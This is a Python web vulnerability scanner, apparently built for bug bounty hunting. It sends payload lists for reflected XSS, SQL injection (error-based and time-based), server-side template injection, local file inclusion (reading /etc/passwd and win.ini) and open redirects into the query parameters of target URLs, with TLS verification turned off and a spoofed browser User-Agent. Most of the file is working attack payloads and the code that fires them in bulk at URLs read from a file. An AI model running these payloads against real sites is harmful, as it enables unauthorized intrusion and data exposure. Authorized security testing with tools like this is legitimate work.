import json, os, sys, urllib.request, urllib.parse, urllib.error, re, ssl as ssl_mod
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

BB_DIR = os.path.dirname(os.path.abspath(__file__))
os.makedirs(os.path.join(BB_DIR, "reports"), exist_ok=True)
SSL_CTX = ssl_mod.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl_mod.CERT_NONE

PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<ScRiPt>alert(1)</sCrIpT>",
    ],
    "sqli": [
        "'",
        "1' OR '1'='1",
        "1' OR 1=1--",
        "1' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL--",
        "admin'--",
        "\" OR 1=1--",
        "1 AND SLEEP(5)",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
    ],
    "ssti": [
        "{{7*7}}",
        "${{7*7}}",
        "#{7*7}",
        "{{config}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "..%2f..%2f..%2f..%2fetc/passwd",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "//google.com",
        "/\\evil.com",
    ],
}

def log(msg, status="+"):
    ts = datetime.now().strftime("%H:%M:%S")
    color = {"+": "32", "-": "31", "*": "33", "!": "36"}.get(status, "0")
    print(f"\033[{color}m[{status}]\033[0m {msg}")

def req(url, timeout=8):
    r = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=SSL_CTX)
        return resp.status, resp.read().decode("utf-8", errors="ignore"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="ignore"), dict(e.headers)
    except Exception as e:
        return None, str(e), {}

def test_reflected_xss(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    new_params = params.copy()
    new_params[param] = payload
    new_qs = urllib.parse.urlencode(new_params, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
    status, body, headers = req(test_url)
    if body and payload in body:
        # Check if reflected in HTML context (not just in input value)
        reflected_count = body.count(payload)
        if reflected_count > 0:
            return {"url": test_url, "param": param, "payload": payload, "status": status, "evidence": f"Reflected {reflected_count}x"}
    return None

def test_sqli_reflected(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    new_params = params.copy()
    new_params[param] = payload
    new_qs = urllib.parse.urlencode(new_params, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
    status, body, headers = req(test_url)

    errors = [
        "sql", "mysql", "syntax error", "unclosed quotation mark",
        "odbc", "driver", "microsoft ole db", "oracle", "postgresql",
        "sqlite", "sql server", "division by zero"
    ]
    if body:
        body_lower = body.lower()
        for err in errors:
            if err in body_lower:
                return {"url": test_url, "param": param, "payload": payload, "type": err, "status": status}
    return None

def test_lfi(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    new_params = params.copy()
    new_params[param] = payload
    new_qs = urllib.parse.urlencode(new_params, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
    status, body, headers = req(test_url)
    indicators = ["root:", "nobody:", "/bin/bash", "[extensions]", "; for 16-bit"]
    if body:
        for ind in indicators:
            if ind in body:
                return {"url": test_url, "param": param, "payload": payload, "evidence": f"Contains '{ind}'", "status": status}
    return None

def test_ssti(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    new_params = params.copy()
    new_params[param] = payload
    new_qs = urllib.parse.urlencode(new_params, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
    status, body, headers = req(test_url)
    if payload == "{{7*7}}" and body and "49" in body and "{{7*7}}" not in body:
        return {"url": test_url, "param": param, "payload": payload, "status": status}
    if body and payload in body:
        return None
    return None

def test_open_redirect(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    new_params = params.copy()
    new_params[param] = payload
    new_qs = urllib.parse.urlencode(new_params, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
    try:
        r = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
        r.method = "HEAD"
        resp = urllib.request.urlopen(r, timeout=8, context=SSL_CTX)
        loc = resp.headers.get("Location", "")
        if "evil.com" in loc or "google.com" in loc:
            return {"url": test_url, "param": param, "payload": payload, "redirects_to": loc, "status": resp.status}
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location", "")
        if "evil.com" in loc or "google.com" in loc:
            return {"url": test_url, "param": param, "payload": payload, "redirects_to": loc, "status": e.code}
    except:
        pass
    return None

def scan_url(url, vuln_types=["xss", "sqli", "lfi", "ssti", "open_redirect"]):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return {"url": url, "vulnerabilities": []}

    log(f"Scanning {url} ({len(params)} params: {list(params.keys())})")
    results = {"url": url, "vulnerabilities": []}
    testers = {
        "xss": test_reflected_xss,
        "sqli": test_sqli_reflected,
        "lfi": test_lfi,
        "ssti": test_ssti,
        "open_redirect": test_open_redirect,
    }

    for vtype in vuln_types:
        if vtype not in PAYLOADS:
            continue
        tester = testers.get(vtype)
        if not tester:
            continue
        for param in params:
            for payload in PAYLOADS[vtype]:
                try:
                    result = tester(url, param, payload)
                    if result:
                        result["type"] = vtype
                        results["vulnerabilities"].append(result)
                        log(f"\033[31m[!] {vtype.upper()} on {param}: {payload[:40]}\033[0m")
                        break  # one finding per param per type is enough
                except Exception as e:
                    pass

    return results

def scan_urls_from_file(file_path, vuln_types=["xss", "sqli", "lfi", "ssti", "open_redirect"]):
    if not os.path.exists(file_path):
        log(f"File not found: {file_path}", "-")
        return []

    urls = []
    with open(file_path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)

    log(f"Scanning {len(urls)} URLs...", "!")
    results = []
    u = 0
    for url in urls:
        u += 1
        log(f"[{u}/{len(urls)}] Scanning...", "*")
        res = scan_url(url, vuln_types)
        if res["vulnerabilities"]:
            results.append(res)

    # Save results
    output = os.path.join(BB_DIR, "reports", f"vulnscan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(output, "w") as f:
        json.dump(results, f, indent=2, default=str)
    log(f"Scan complete! Report: {output}", "!")

    total = sum(len(r["vulnerabilities"]) for r in results)
    log(f"Total findings: {total}", "!")
    for r in results:
        for v in r["vulnerabilities"]:
            print(f"  \033[31m{v['type'].upper()}\033[0m | {v['param']} | {v.get('payload','')[:50]} | {r['url'][:80]}")

    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python bb_vulnscan.py <url>")
        print("  python bb_vulnscan.py <urls_file>")
        print("  python bb_vulnscan.py <url> --types xss,sqli")
        sys.exit(1)

    target = sys.argv[1]
    types = ["xss", "sqli", "lfi", "ssti", "open_redirect"]
    for arg in sys.argv[2:]:
        if arg.startswith("--types="):
            types = arg.split("=")[1].split(",")

    if os.path.isfile(target):
        scan_urls_from_file(target, types)
    else:
        result = scan_url(target, types)
        print(json.dumps(result, indent=2, default=str))
